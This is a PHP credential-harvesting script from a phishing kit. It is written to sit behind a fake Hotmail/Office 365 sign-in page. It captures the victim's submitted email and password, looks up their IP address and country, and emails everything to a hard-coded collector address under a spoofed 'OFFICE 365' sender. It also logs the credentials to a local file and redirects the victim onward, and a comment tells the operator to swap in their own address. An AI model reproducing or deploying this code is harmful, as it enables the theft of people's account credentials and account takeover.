<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "==========+[ User & Pass ]+==========\n";
$message .= "Email: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "==========+[ GET ]+==========\n";
$message .= "Client IP: 		".$ip."\n";
$message .= "==========+[ xxxxx ]+==========\n";
//change ur email here
$send = "frankossy466@gmail.com";
$subject = "Hotmail ".$_POST['login']."n";
$headers = "From: OFFICE 365<mail@xsendersecurity.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);


 }
 file_put_contents('../robot.txt', $message, FILE_APPEND);
    header("Location: sec/index.php?email=".$_POST['login']."\n");
?>